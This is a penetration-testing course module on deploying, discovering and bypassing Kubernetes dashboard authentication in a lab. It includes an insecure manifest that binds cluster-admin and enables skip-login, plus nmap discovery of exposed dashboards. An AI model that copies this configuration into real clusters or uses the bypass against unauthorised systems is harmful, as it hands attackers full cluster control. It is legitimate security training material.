_Kubernetes_[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fn-local_id_1229-1) is open-source software that assists with the monitoring and management of a Kubernetes cluster. The included dashboard provides an easy-to-use graphical interface that displays metrics, application status, and (with proper permissions) can modify the cluster. This dashboard could grant an attacker absolute control of a cluster.

In this Learning Module, we will show how a Kubernetes dashboard might be exposed, how to discover it in a blackbox scenario, the various levels of information an attacker could retrieve from it, and how they might create a backdoor. We will discuss exploitation and backdoor installation in a later Learning Module.

We will cover the following Learning Units:

- Exposing a Kubernetes Dashboard
- Discovering Exposed Dashboards
- Exploiting an Exposed Dashboard

1

(Kubernetes, 2022), [https://Kubernetes.io/](https://Kubernetes.io/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fnref-local_id_1229-1)

## 9.1. Exposing a Kubernetes Dashboard

Before discovering and exploiting a Kubernetes dashboard, let's discuss how the dashboard can be configured. We'll begin by interacting with a Kubernetes-recommended secure configuration and explore the manifest that configured the dashboard. After this we'll incrementally add vulnerabilities to show various attack vectors.

Although these vulnerable builds deviate from the recommended installation, they add conveniences, which makes these builds common in the wild.

This Learning Unit covers the following Learning Objectives:

- Understand how to access the lab
- Run and use the Kubernetes Dashboard
- Understand a secure installation
- Understand an exposed dashboard
- Understand an insecure exposed dashboard

## 9.1.1. Accessing the Lab

In this Learning Module, we'll use three servers to learn about exposed Kubernetes Dashboards:

- **Kubernetes-default**: a bare-bones Ubuntu machine with a default Kubernetes installation
- **Dashboard-exposed**: a vulnerable machine with an exposed Kubernetes dashboard
- **Dashboard-exposed-secure**: a machine with a secure exposed Kubernetes dashboard

In order to access these servers, we have created three **/etc/hosts** file entries on our Kali Linux VM:

```
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.121.122  kube-default
192.168.121.125  dashboard-exposed
192.168.121.128  dashboard-exposed-secure
```

> Listing 1 - /etc/hosts entries

For now, we'll simply set up our **hosts** file on our Kali machine and start these virtual machines:

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

|   |   |   |
|---|---|---|
|kube-default|||
|dashboard-exposed|||
|dashboard-exposed-secure|||

## 9.1.2. Running and Using the Dashboard

Before reviewing the dashboard configuration, let's first start the dashboard and interact with it. We'll **ssh** to _kube-default_ and run several commands to start the dashboard. Since kube-default has neither a user interface nor a browser, we'll create an SSH tunnel to port-forward to the dashboard. We'll access this port with our browser on our Kali machine.

To do this, we'll use the **-L** argument on the **ssh** command, and we'll specify that we want 127.0.0.1:8001 on our local machine forwarded to 127.0.0.1:8001 on our Kali machine.

SSH tunneling is a whole subject to study. While we won't discuss the inner workings here, our goal is to simply convey that the tunnel will mirror anything on port 8001 on kube-default to our Kali machine. This will give us access to the dashboard from any system that has a browser.

```
student@kali:~$ ssh -L 127.0.0.1:8001:127.0.0.1:8001 student@kube-default
student@kube-default's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
...

student@kube-default:~$ 
```

> Listing 2 - Logging in to kube-default via SSH

Now that we're logged in and have established an SSH tunnel, let's start the dashboard using the recommended manifest. Later in this Learning Unit, we'll investigate the components that make up the recommended manifest.

We'll start the dashboard with the **kubectl** and **apply** commands. We'll also provide the **-f** flag, which will let us select the **recommended.yaml** file.

```
student@kube-default:~$ ls -lh
total 28K
-rw-r--r-- 1 ubuntu ubuntu 7.3K Feb 17 15:16 exposed.yaml
-rw-r--r-- 1 ubuntu ubuntu 8.0K Feb 23 14:01 insecure.yaml
-rw-r--r-- 1 ubuntu ubuntu 7.2K Feb 23 10:28 recommended.yaml

student@kube-default:~$ kubectl apply -f recommended.yaml
namespace/kubernetes-dashboard created
serviceaccount/kubernetes-dashboard created
service/kubernetes-dashboard created
secret/kubernetes-dashboard-certs created
secret/kubernetes-dashboard-csrf created
secret/kubernetes-dashboard-key-holder created
configmap/kubernetes-dashboard-settings created
role.rbac.authorization.k8s.io/kubernetes-dashboard created
clusterrole.rbac.authorization.k8s.io/kubernetes-dashboard created
rolebinding.rbac.authorization.k8s.io/kubernetes-dashboard created
clusterrolebinding.rbac.authorization.k8s.io/kubernetes-dashboard created
deployment.apps/kubernetes-dashboard created
service/dashboard-metrics-scraper created
deployment.apps/dashboard-metrics-scraper created
```

> Listing 3 - Starting the Recommended Dashboard Manifest

While the dashboard is running, it's not accessible from localhost or our Kali machine. To make it accessible, we'll need to run **kubectl proxy**. This will create a proxy between localhost and the Kubernetes API server on port 8001. This will let us access the service running the Kubernetes dashboard.

```
student@kube-default:~$ kubectl proxy
Starting to serve on 127.0.0.1:8001
```

> Listing 4 - Starting the Proxy Server

Even though the proxy server is only accessible on the localhost interface of kube-default, we should be able to access it on our Kali machine through our SSH tunnel.

We could also achieve this by configuring kubectl in Kali to remotely control the Kubernetes cluster and then run the proxy command. However, the SSH tunnel ensures we don't have to configure kubectl with the cluster.

Let's open a browser in Kali and navigate to **http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/**.

The path of the URL isn't important for this Learning Module. This is the dashboard access URL from the Kubernetes documentation.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/851d5b829384a5a118aa3ed8dea6c878_MD5.jpg]]

Figure 1: Kubernetes Dashboard Login Page

The first page we navigate to requires a login. In the current Kubernetes cluster, we've created an administrator user for this purpose.

Let's create the token for this user using the **kubectl** command. However, since **kubectl proxy** is running in the SSH session, let's connect with a new SSH session to get this value.

```
student@kali:~$ ssh student@kube-default
student@kube-default's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
...
student@kube-default:~$ 
```

> Listing 2 - Logging into kube-default via SSH

We'll create a token for the _kubernetes-dashboard_ Service Account using **kubectl**. We are using the arguments of **kubect create token kubernetes-dashboard -n kubernetes-dashboard** to specify we are creating a new access token for the "kubernetes-dashboard" Service Account in the "kubernetes-dashboard" namespace.

```
student@kube-default:~$ kubectl create token kubernetes-dashboard -n kubernetes-dashboard
eyJhbGciOiJSUzI1NiIsImtpZCI6Im1TYllxcTYxMHp2eG45V09WTEU0eEhKN3k4YWx4TzRfVDZ4MVNVdWJ3LUUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzMxMDk4ODMwLCJpYXQiOjE3MzEwOTUyMzAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYTIyNGRkMjYtNGFiMS00YTQwLWIxMWQtYjlmY2IyZTVjODM1Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsInVpZCI6IjE0NzlmNGNjLThlYmQtNDgzZC05MjZhLTBiYmEwNzZjOWRhNCJ9fSwibmJmIjoxNzMxMDk1MjMwLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQifQ.tdDoY7a2DHBXqs-Zp13KAOr36Jmccpp2Psy-N16zwd3hmoMLTfu9DkEQRspHKK6cqdRtf_2Z1DXmBelv5O6ZG0jrPK0Z4qeWeY8wmkrXessKJiCFZAtS_NtSZ5A6GOogD8EYfSSU__GuIBnY-IQ96N_pgXGMEZG4Kq2qcNNUype6T_sZQRad9vFwFGO2pZCI5d3TYFPYQqXol5RQXCaxk9QYh9qznkaX3qeSje08-HsttIWbAxySma8r_Ru2rDls4mMpzkRsxF3Q9mKHThp6SBFshT7B79JeW4Z_d7WrfH7vWKRvQ5aldRaDe5vpuUONrVk1UZsjQrhcJbhnvoKpsQ
```

> Listing 5 - Create Kubernetes token

Let's copy this token value from the lab and enter it on the login page. The token will generated in our lab environment when we run the command, so we'll use the token in our terminal rather than the token in the example.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/79fcaf739a4b47b7e7f103389a670ed7_MD5.jpg]]

Figure 2: Kubernetes Dashboard Login Page With Token

Next, we'll click _Sign In_.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/2bd84e093592b110b79c5d5d2e91dcee_MD5.jpg]]

Figure 3: Kubernetes Dashboard Home Page

From here, we can manage the entire Kubernetes cluster from the dashboard. We won't go into the features of the dashboard in this section.

With access to the dashboard, let's discuss how the Dashboard is started, and its individual components.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

kube-default

#### Labs

1. Using the dashboard, what is the image name and version used for the nginx-deployment?

Answer

2. Under the _About_ menu, what is the version of the dashboard currently being used?

Answer

3. Instead of using an SSH tunnel, kubectl proxy also supports specifying the network address to be 0.0.0.0 instead of 127.0.0.1. We can achieve this by running: **kubectl proxy --address="0.0.0.0" --disable-filter=true** However, this results in another error. What is the error message when the dashboard is visited with the public network address?

Answer

## 9.1.3. Reviewing a Secure Dashboard Configuration

Let's review the recommended (and most secure) way to start and access the Kubernetes dashboard. As we'll find, this dashboard can manage the entire Kubernetes cluster. Because of this, the default dashboard configuration does not expose a port publicly, and instead is intended to be accessed through a proxy server running on localhost.

The recommended manifest is provided by Kubernetes. We've downloaded the file to our lab machine for easier access.

Let's **ssh** to kube-default and review this recommended manifest.

```
student@kali:~$ ssh student@kube-default
student@kube-default's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
...

student@kube-default:~$ ls -lh
total 28K
-rw-r--r-- 1 ubuntu ubuntu 7.3K Feb 17 15:16 exposed.yaml
-rw-r--r-- 1 ubuntu ubuntu 8.1K Feb 17 15:16 insecure.yaml
-rw-r--r-- 1 ubuntu ubuntu 7.2K Feb 17 15:16 recommended.yaml
```

> Listing 6 - Logging into kube-default via SSH

The file we'll be reviewing is **/home/ubuntu/recommended.yaml**, which weighs in at over 300 lines. We won't go through every line, but we'll instead highlight some important sections. Let's begin with the declaration of the deployment, which starts on line 170:

```
170	kind: Deployment
171	apiVersion: apps/v1
172	metadata:
173	  labels:
174	    k8s-app: kubernetes-dashboard
175	  name: kubernetes-dashboard
176	  namespace: kubernetes-dashboard
177	spec:
...cut...
183	  template:
...cut...
187	    spec:
...cut...
191	      containers:
192	        - name: kubernetes-dashboard
193	          image: kubernetesui/dashboard:v2.5.0
...cut...
198	          args:
199	            - --auto-generate-certificates
200	            - --namespace=kubernetes-dashboard
201	          volumeMounts:
202	            - name: kubernetes-dashboard-certs
203	              mountPath: /certs
204	              # Create on-disk volume to store exec logs
...cut...
219	      volumes:
220	        - name: kubernetes-dashboard-certs
221	          secret:
222	            secretName: kubernetes-dashboard-certs
...cut...
225	      serviceAccountName: kubernetes-dashboard
...cut...
```

> Listing 7 - Deployment Section of Manifest

Within the _Deployment_ section of the manifest, line 176 reveals that this deployment will be placed in the _kubernetes-dashboard_ namespace. Line 193 indicates that the manifest file uses the _kubernetesui/dashboard_ image tagged with version 2.5.0.

On lines 199 and 200, the manifest instructs the container to run with two arguments. The first instructs the dashboard to generate self-signed certificates that will be used for hosting the application with HTTPS. These certificates are mounted in the container in the **/certs** directory as indicated by the volume declared on lines 219-222 and the mount found on lines 201-204. Line 199 indicates the namespace the dashboard application will use to create its encryption key.

Finally, line 225 lists the service account that will be used to authenticate the dashboard. In its recommended state, the dashboard only uses this service account to store the settings, keys, and other artifacts needed to run the dashboard.

However, if the role for this service account is over-privileged, dashboard users will be able to skip the login and share the privileges of the service account. In this scenario, dashboard users can bypass the login.

Let's investigate the service account and role in the manifest to confirm that the recommended configuration is not over-privileged.

```
22	apiVersion: v1
23	kind: ServiceAccount
24	metadata:
25	  labels:
26	    k8s-app: kubernetes-dashboard
27	  name: kubernetes-dashboard
28	  namespace: kubernetes-dashboard
```

> Listing 8 - Service Account Section

The recommended Kubernetes dashboard configuration has named almost all resources _kubernetes-dashboard_. This can get confusing, but fortunately the _kind_ attribute reveals the type of resource.

The _kubernetes-dashboard_ service account is created on lines 22-28.

```
93	kind: Role
94	apiVersion: rbac.authorization.k8s.io/v1
95	metadata:
96	  labels:
97	    k8s-app: kubernetes-dashboard
98	  name: kubernetes-dashboard
99	  namespace: kubernetes-dashboard
100	rules:
101	  # Allow Dashboard to get, update and delete Dashboard exclusive secrets.
102	  - apiGroups: [""]
103	    resources: ["secrets"]
104	    resourceNames: ["kubernetes-dashboard-key-holder", "kubernetes-dashboard-certs", "kubernetes-dashboard-csrf"]
105	    verbs: ["get", "update", "delete"]
106	    # Allow Dashboard to get and update 'kubernetes-dashboard-settings' config map.
107	  - apiGroups: [""]
108	    resources: ["configmaps"]
109	    resourceNames: ["kubernetes-dashboard-settings"]
110	    verbs: ["get", "update"]
111	    # Allow Dashboard to get metrics.
112	  - apiGroups: [""]
113	    resources: ["services"]
114	    resourceNames: ["heapster", "dashboard-metrics-scraper"]
115	    verbs: ["proxy"]
116	  - apiGroups: [""]
117	    resources: ["services/proxy"]
118	    resourceNames: ["heapster", "http:heapster:", "https:heapster:", "dashboard-metrics-scraper", "http:dashboard-metrics-scraper"]
119	    verbs: ["get"]
```

> Listing 9 - Role Section

The role and various values are declared on lines 93-119. The comment on line 101 indicates that the first rule will configure permissions to allow access to dashboard-specific secrets. The comment on line 106 indicates that the dashboard has access to the settings _config map_. The comment on line 111 reveals that the dashboard is allowed to get metrics information.

```
137	apiVersion: rbac.authorization.k8s.io/v1
138	kind: RoleBinding
139	metadata:
140	  labels:
141	    k8s-app: kubernetes-dashboard
142	  name: kubernetes-dashboard
143	  namespace: kubernetes-dashboard
144	roleRef:
145	  apiGroup: rbac.authorization.k8s.io
146	  kind: Role
147	  name: kubernetes-dashboard
148	subjects:
149	  - kind: ServiceAccount
150	    name: kubernetes-dashboard
151	    namespace: kubernetes-dashboard
```

> Listing 10 - Role Binding Section

On lines 137-151, the role is attached to the service account.

By reviewing the service account, role, and role binding, we now know what permissions the dashboard has to the Kubernetes cluster. These permissions are not enough to manage the entire Kubernetes cluster. Instead, they are the bare minimum required for the dashboard to store and access settings, TLS keys and certificates, and metrics data.

Since the dashboard server itself does not have permissions to manage the cluster, how do we have access to manage the cluster when we log in with a token? The Kubernetes dashboard uses the provided token to make the appropriate request to the cluster. This means that the dashboard can only ever have as much permissions to the cluster as the user using the cluster, at least according to the recommended configuration.

However, if the _kubernetes-dashboard_ user is over-permissioned, all accounts will have more privileges than needed. We'll investigate how this could happen in a later manifest.

Next, let's discuss how the dashboard is exposed and why we require an SSH tunnel to access it.

```
32	kind: Service
33	apiVersion: v1
34	metadata:
35	  labels:
36	    k8s-app: kubernetes-dashboard
37	  name: kubernetes-dashboard
38	  namespace: kubernetes-dashboard
39	spec:
40	  ports:
41	    - port: 443
42	      targetPort: 8443
43	  selector:
44	    k8s-app: kubernetes-dashboard
```

> Listing 11 - Service Section

The dashboard uses a service to expose the dashboard as indicated by lines 32-44. On lines 41-42 we find that port 443 (HTTPS) on the dashboard will be mapped to port 8443 in the cluster. In this service declaration of the manifest, the type of service is not specified. There are multiple service types, and they all behave differently. The ClusterIP and NodePort service types are defined by the Kubernetes documentation[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fn-local_id_1236-1) as:

- **ClusterIP**: "Exposes the Service on a cluster-internal IP. Choosing this value makes the Service only reachable from within the cluster. This is the default ServiceType".
    
- **NodePort**: "Exposes the Service on each Node's IP at a static port (the NodePort). A ClusterIP Service, to which the NodePort Service routes, is automatically created. You'll be able to contact the NodePort Service, from outside the cluster, by requesting <NodeIP>:<NodePort>".
    

Since the service does not specify the type, the default will be _ClusterIP_. This means that the dashboard is only accessible internally.

However, this can be inconvenient for a developer and certain users may request that the Kubernetes dashboard be exposed on the node directly.

Let's review a manifest that exposes the port so it is accessible externally.

1

(Kubernetes, 2022), [https://kubernetes.io/docs/concepts/services-networking/service/#publishing-services-service-types](https://kubernetes.io/docs/concepts/services-networking/service/#publishing-services-service-types) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fnref-local_id_1236-1)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

kube-default

#### Labs

1. In **recommended.yaml**, there is a _ConfigMap_ to store the settings of the dashboard. What is the name of this resource?

Answer

2. What is the name of the Service that exposes port 8000?

Answer

## 9.1.4. Reviewing an Exposed Dashboard Configuration

Now that we know why the dashboard is not exposed, let's review a manifest in which the service type was changed from ClusterIP (the default) to NodePort. We have provided this file in the kube-default host within the **exposed.yaml** file.

Let's **ssh** to the host and review this file.

```
student@kali:~$ ssh student@kube-default
student@kube-default's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
...

student@kube-default:~$ ls -lh 
total 32K
-rw-r--r-- 1 ubuntu ubuntu 7.3K Feb 17 15:16 exposed.yaml
-rw-r--r-- 1 ubuntu ubuntu 8.1K Feb 17 15:16 insecure.yaml
-rw-r--r-- 1 ubuntu ubuntu 7.2K Feb 23 10:28 recommended.yaml
```

> Listing 6 - Logging into kube-default via SSH

While we could review the entire manifest again, to save time we'll only review the differences using the **diff** command. We'll pass in the **recommended.yaml** file we already reviewed and **exposed.yaml**, which contains the changes.

```
student@kube-default:~$ diff recommended.yaml exposed.yaml 
44a45,46
>   # Expose the service via NodePort (Random port between 30000-32768)
>   type: NodePort
```

> Listing 12 - Running Diff on recommended.yaml and exposed.yaml

The output shows us that the change was on lines 45 and 46.

A comment was added on line 45 to explain the change, and the type of the service was changed to _NodePort_ from the default (ClusterIP) on line 46.

As indicated by the comment, this change will expose a random port between 30000 and 32768, unless otherwise specified. Let's apply this manifest, find the port, and browse it.

We'll apply the manifest first with the **kubectl** command, using the **apply** instruction, and passing in the **exposed.yaml** file with the **-f** flag.

```
student@kube-default:~$ kubectl apply -f exposed.yaml
namespace/kubernetes-dashboard unchanged
serviceaccount/kubernetes-dashboard unchanged
service/kubernetes-dashboard configured
secret/kubernetes-dashboard-certs unchanged
secret/kubernetes-dashboard-csrf configured
Warning: resource secrets/kubernetes-dashboard-key-holder is missing the kubectl.kubernetes.io/last-applied-configuration annotation which is required by kubectl apply. kubectl apply should only be used on resources created declaratively by either kubectl create --save-config or kubectl apply. The missing annotation will be patched automatically.
secret/kubernetes-dashboard-key-holder configured
configmap/kubernetes-dashboard-settings unchanged
role.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
clusterrole.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
rolebinding.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
clusterrolebinding.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
deployment.apps/kubernetes-dashboard unchanged
service/dashboard-metrics-scraper unchanged
deployment.apps/dashboard-metrics-scraper unchanged

```

> Listing 13 - Applying the Exposed manifest

The only change that was applied was the service, as expected. Now let's find which port was chosen. We'll again use **kubectl**; however, this time we'll use the **get** instruction. We'll indicate that we're trying to get information about a **service** and filter the results to the **kubernetes-dashboard** namespace.

```
student@kube-default:~$ kubectl get service -n kubernetes-dashboard
NAME                        TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)       
dashboard-metrics-scraper   ClusterIP   10.43.103.213   <none>        8000/TCP      
kubernetes-dashboard        NodePort    10.43.120.185   <none>        443:31530/TCP 
```

> Listing 14 - Obtaining the Port

In our case, the selected port was 31530.

Next, let's visit this port from Kali by navigating to **https://kube-default:31530/**. We'll click past the bad certificate error.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/70a2c76c8bea3147f8c68771798f3809_MD5.jpg]]

Figure 3: Kubernetes Dashboard Home Page

While this does expose the Kubernetes dashboard, we're still required to log in to get anything of value. If we discovered this dashboard in a penetration test, we would report it to the client and as long as it's not running a vulnerable version, it would represent a low-risk finding.

Next, let's investigate what other changes could be made to the recommended manifest that increases the risk of this vulnerability.

## 9.1.5. Reviewing an Insecure Dashboard Configuration

So far, we've reviewed a manifest that deploys the dashboard in the recommended configuration, and we've also deployed a manifest that exposes the dashboard from the host IP. However, the dashboard can be configured even more insecurely by removing authentication. To understand why an organization might deploy this configuration, we'll need to think like a developer.

Most of the development environments are behind a firewall available only to other developers or employees. This creates a certain level of trust between a developer and their peers. In this case, the team might disable authentication to avoid the process of creating new service accounts and tokens just to manage the cluster. However, if an attacker were to get past the firewall, they would be able to pivot to the development environment.

On kube-default, we have provided an **insecure.yaml** file that contains even more changes from **exposed.yaml**. Let's review these changes.

In this content, we'll break down the sections that have changed. In the lab, we recommend running **colordiff exposed.yaml insecure.yaml --side-by-side** to review the differences side-by-side

We'll start by reviewing the addition on lines 308-323.

```
311	# ClusterRoleBinding to bind the cluster-admin role to the service account used by the dashboard
312	apiVersion: rbac.authorization.k8s.io/v1
313	kind: ClusterRoleBinding
314	metadata:
315	  name: insecure-dashboard
316	roleRef:
317	  apiGroup: rbac.authorization.k8s.io
318	  kind: ClusterRole
319	  name: cluster-admin
320	subjects:
321	- kind: ServiceAccount
322	  name: kubernetes-dashboard
323	  namespace: kubernetes-dashboard
```

> Listing 15 - New Cluster Role Binding

This section will bind the _cluster-admin_ role to the kubernetes-dashboard service account. The cluster-admin role[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fn-local_id_1240-1) is a superuser role that gives permission to every part of the cluster.

Next, let's review the new comments on line 94 and 138.

```
94	# The custom role is no longer used since the permission of the cluster-admin role is greater
95	kind: Role
96	apiVersion: rbac.authorization.k8s.io/v1
97	metadata:
98	  labels:
99	    k8s-app: kubernetes-dashboard
100	  name: kubernetes-dashboard
101	  namespace: kubernetes-dashboard
...cut...
138	# The custom Role Binding is no longer used since the permission of the cluster-admin role is greater
139	apiVersion: rbac.authorization.k8s.io/v1
140	kind: RoleBinding
141	metadata:
142	  labels:
143	    k8s-app: kubernetes-dashboard
144	  name: kubernetes-dashboard
145	  namespace: kubernetes-dashboard

```

> Listing 16 - New Comments

The changes on line 94 and 138 indicate that because of the new cluster role bindings, the old role and binding are not necessary. Since the cluster role binding has all the permissions of the original role, the role with the higher permission (the cluster-admin) will be used.

This new role binding means that the kubernetes-dashboard application has access to every part of the cluster. However, it still requires authentication. Let's examine how this change enables the authentication bypass.

```
194	 containers:
195	   - name: kubernetes-dashboard
196	     image: kubernetesui/dashboard:v2.5.0
197	     imagePullPolicy: Never
198	     ports:
199	       - containerPort: 8443
200	         protocol: TCP
201	     args:
202	       - --auto-generate-certificates
203	       - --namespace=kubernetes-dashboard
204	       # Allow users to skip the login and "ride" the service account assigned to this deployment
205	       - --enable-skip-login
```

> Listing 17 - New Argument in Deployment

On line 205, a new argument (**--enable-skip-login**) is added when starting the kubernetes-dashboard container. This adds a _Skip Login_ button on the home screen and allows us to ride the cluster-admin session.

Let's apply this manifest to interact with a vulnerable dashboard.

```
student@kube-default:~$ kubectl apply -f insecure.yaml 
namespace/kubernetes-dashboard unchanged
serviceaccount/kubernetes-dashboard unchanged
service/kubernetes-dashboard unchanged
secret/kubernetes-dashboard-certs unchanged
secret/kubernetes-dashboard-csrf unchanged
secret/kubernetes-dashboard-key-holder unchanged
configmap/kubernetes-dashboard-settings unchanged
role.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
clusterrole.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
rolebinding.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
clusterrolebinding.rbac.authorization.k8s.io/kubernetes-dashboard unchanged
deployment.apps/kubernetes-dashboard configured
service/dashboard-metrics-scraper unchanged
deployment.apps/dashboard-metrics-scraper unchanged
clusterrolebinding.rbac.authorization.k8s.io/insecure-dashboard created

```

> Listing 18 - Applying Insecure Manifest

The port should not have changed, but we can check again by using **kubectl**.

```
student@kube-default:~$ kubectl get service -n kubernetes-dashboard
NAME                        TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)       
dashboard-metrics-scraper   ClusterIP   10.43.103.213   <none>        8000/TCP      
kubernetes-dashboard        NodePort    10.43.120.185   <none>        443:31572/TCP 
```

> Listing 19 - Obtaining Port using Kubectl

Let's browse the page from Kali.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/482d57e30e7bdc22f282b2ec090d8557_MD5.jpg]]

Figure 4: Kubernetes Dashboard Login Page with Skip Option

The new login page has a _Skip_ button. If we click it, we do not have to authenticate and can ride the permissions of the service account.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/80ade0d114215402dbaddbfa9d3357e9_MD5.jpg]]

Figure 5: Kubernetes Dashboard Login Page with Skip Option

While it might seem unlikely for an administrator to configure the dashboard to run in such an insecure way, it does happen in the field.[2](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fn-local_id_1240-2) For example, configurations like this can end up in production environments if developers are attempting to debug an issue in production and forget to turn it off after they're done with it.

1

(Kubternetes, 2021), [https://kubernetes.io/docs/reference/access-authn-authz/rbac/#user-facing-roles](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#user-facing-roles) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fnref-local_id_1240-1)

2

(Ars Technica, 2018), [https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware/](https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware/) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fnref-local_id_1240-2)

## 9.2. Discovering Exposed Dashboards

Now that we understand what causes the issue, let's investigate how to discover exposed dashboards using a blackbox perspective.

This Learning Unit covers the following Learning Objectives:

- Use Nmap to scan a host
- Understand the scan results of a host with an exposed Kubernetes dashboard
- Discover an exposed Kubernetes dashboard configured securely

## 9.2.1. Using Nmap to Discover an Exposed Dashboard

When approaching an unknown host, we'll need to first detect if it is a Kubernetes system. In this section, we'll investigate how to use Nmap[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fn-local_id_1242-1) and a browser to discover a vulnerable endpoint. We'll also investigate a securely-configured Kubernetes.

Let's begin with a simple Nmap scan. We'll run **nmap** against the exposed dashboard target. We can scan all ports with **-p-** and enable OS detections, version detection, and script scanning with the **-A** flag. A scan like this might take some time to complete.

```
student@kali:~$ sudo nmap dashboard-exposed -p- -A
...
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
...
6443/tcp  open  ssl/sun-sr-https?
...
10250/tcp open  ssl/http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
...
10251/tcp open  unknown
...
31275/tcp open  ssl/http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Kubernetes Dashboard
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: 
| Not valid before: 2022-02-24T17:49:40
|_Not valid after:  2023-02-24T17:49:40
...
```

> Listing 20 - Using Nmap to Scan Host

In the lab, the dashboard-exposed host will run the dashboard on a different port.

While Nmap wasn't able to confirm the exact services for all the ports, we can deduce that this system is running Kubernetes and more specifically the _K3s_[2](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/discovering-exposed-kubernetes-dashboards-39863/exploiting-an-exposed-dashboard-39890/running-a-backdoor-39864#fn-local_id_1242-2) distribution (Lightweight Kubernetes). Port 6443 is usually an indicator of the Kubernetes API server. Ports 10250 and 10251 on K3s typically run the metrics server. While these ports might also be lucrative in a penetration test, for the purposes of this Learning Module we will focus on port 31275.

The scan reveals that 31275/TCP is open with an HTTP title of "Kubernetes Dashboard". This is a clear indication of a Kubernetes dashboard running on this node.

This port number will vary because the dashboard could be exposed using a NodePort, in which we would find a port in the range of 30000-32768. However, the port could also be exposed via a load balancer, which could result in the dashboard running on any other port, including 80 and 443.

If we browse the port on the host, we'll find the _Skip_ button to bypass authentication.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/d9a225c4dc96ed2586e8c19cac3b298e_MD5.jpg]]

Figure 6: Kubernetes Dashboard Login Page with Skip Option

Excellent! While in our situation, the service account has the cluster-admin role bound to it, this is not always the case. Some might only have read-only while others will let us deploy new components. Either way, if we discover a Kubernetes Dashboard with a _Skip_ button on the login page, we can easily discover new information that might lead to further compromise.

1

